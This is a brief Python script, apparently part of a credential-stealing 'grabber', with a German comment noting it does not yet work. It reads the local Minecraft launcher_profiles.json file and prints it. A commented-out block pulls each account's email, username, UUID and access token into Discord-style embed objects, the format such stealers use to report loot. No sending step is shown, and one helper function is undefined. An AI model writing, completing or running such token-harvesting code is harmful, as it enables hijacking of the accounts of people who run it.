import json
import os

APPDATA = os.getenv("APPDATA")




# Funktioniert nicht, vielleicht nur bei Minecraft welches von Mojang heruntergeladen wurde?

auth_db = json.loads(open(APPDATA + "\\.minecraft\\launcher_profiles.json").read())# ["authenticationDatabase"]
print(auth_db)
"""
embeds = []
for x in auth_db:
    try:
        email = auth_db[x].get("username")
        uuid, display_name_object = list(auth_db[x]["profiles"].items())[0]
        embed = {
            "fields": [
                {"name": "Email", "value": email if email and "@" in email else "N/A"},
                {"name": "Username", "value": display_name_object["displayName"].replace("_", "\\_")},
                {"name": "UUID", "value": uuid_dashed(uuid)},
                {"name": "Token", "value": auth_db[x]["accessToken"]}
            ]
        }
        embeds.append(embed)
    except:
        pass

for i in embeds:
    print(i)
"""
